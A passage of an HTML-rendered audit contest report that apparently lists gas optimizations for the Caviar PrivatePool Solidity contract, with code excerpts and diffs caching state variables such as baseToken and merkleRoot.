{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param proof The merkle proof for the weights of each NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @return sum The sum of the weights of each NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function sumWeightsAndValidateProof(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory tokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata tokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256[] memory tokenWeights,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         MerkleMultiProof memory proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) public view returns (uint256) {</span></span></span></code></pre>\n<h2 id=\"g-03-state-variables-can-be-cached-instead-of-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g-03-state-variables-can-be-cached-instead-of-re-reading-them-from-storage\" aria-label=\"g 03 state variables can be cached instead of re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] State variables can be cached instead of re-reading them from storage</h2>\n<p>Caching of a state variable replaces each <code>Gwarmaccess (100 gas)</code> with a much cheaper stack read.</p>\n<p><strong>Note: Some view functions are included below since they are called within state mutating functions</strong></p>\n<p>Total Instances: <code>16</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L742-L746\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L742-L746</a></p>\n<h3 id=\"cache-basetoken-to-save-1-sload\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-1-sload\" aria-label=\"cache basetoken to save 1 sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">742</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">price</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">743</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// ensure that the exponent is always to 18 decimals of accuracy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">744</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> : (</span><span class=\"mtk7\">36</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">// @audit: 1st &amp; 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">745</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">746</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..2f747fc 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -741,7 +741,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @return price The price of the pool.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function price() public view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // ensure that the exponent is always to 18 decimals of accuracy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 exponent = baseToken == address(0) ? 18 : (36 - ERC20(baseToken).decimals());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 exponent = _baseToken == address(0) ? 18 : (36 - ERC20(_baseToken).decimals());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return (virtualBaseTokenReserves * 10 ** exponent) / virtualNftReserves;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738</a></p>\n<h3 id=\"cache-basetoken-to-save-1-sload-1\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-1-sload-1\" aria-label=\"cache basetoken to save 1 sload 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit: 1st and 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..aba824f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -730,7 +730,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @return protocolFeeAmount The protocol fee amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _baseToken = baseToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 exponent = _baseToken == address(0) ? 18 - 4 : ERC20(_baseToken).decimals() - 4;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 feePerNft = changeFee * 10 ** exponent;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         feeAmount = inputAmount * feePerNft / 1e18;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L661-L684\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L661-L684</a></p>\n<h3 id=\"cache-merkleroot-to-save-1-sload\" style=\"position:relative;\"><a href=\"#cache-merkleroot-to-save-1-sload\" aria-label=\"cache merkleroot to save 1 sload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>merkleRoot</code> to save 1 SLOAD</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">661</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sumWeightsAndValidateProof</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">662:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">663:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">664:        </span><span class=\"mtk10\">MerkleMultiProof</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">665</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">666</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// if the merkle root is not set then set the weight of each nft to be 1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">667</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @audit: 1st sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">668</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">669</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">670</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">671</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sum</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">672</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leafs</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// create the leaf for the merkle proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">leafs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">.</span><span class=\"mtk11\">concat</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]))));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">677</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// sum each token weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">678</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">sum</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">679</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">680</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">681</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// validate that the weights are valid against the merkle proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">682</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">MerkleProofLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">verifyMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proof</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proof</span><span class=\"mtk1\">, </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">leafs</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proof</span><span class=\"mtk1\">.</span><span class=\"mtk12\">flags</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @audit: 2nd sload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">683</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidMerkleProof</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">684</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..7385ea9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -664,7 +664,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         MerkleMultiProof memory proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) public view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // if the merkle root is not set then set the weight of each nft to be 1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (merkleRoot == bytes32(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes32 _merkleRoot = merkleRoot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_merkleRoot == bytes32(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             return tokenIds.length * 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -679,7 +680,7 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // validate that the weights are valid against the merkle proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (!MerkleProofLib.verifyMultiProof(proof.proof, merkleRoot, leafs, proof.flags)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (!MerkleProofLib.verifyMultiProof(proof.proof, _merkleRoot, leafs, proof.flags)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert InvalidMerkleProof();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L635-L651\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L635-L651</a></p>\n<h3 id=\"cache-basetoken-to-save-2-sloads\" style=\"position:relative;\"><a href=\"#cache-basetoken-to-save-2-sloads\" aria-label=\"cache basetoken to save 2 sloads permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache <code>baseToken</code> to save 2 SLOADs</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">635</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span 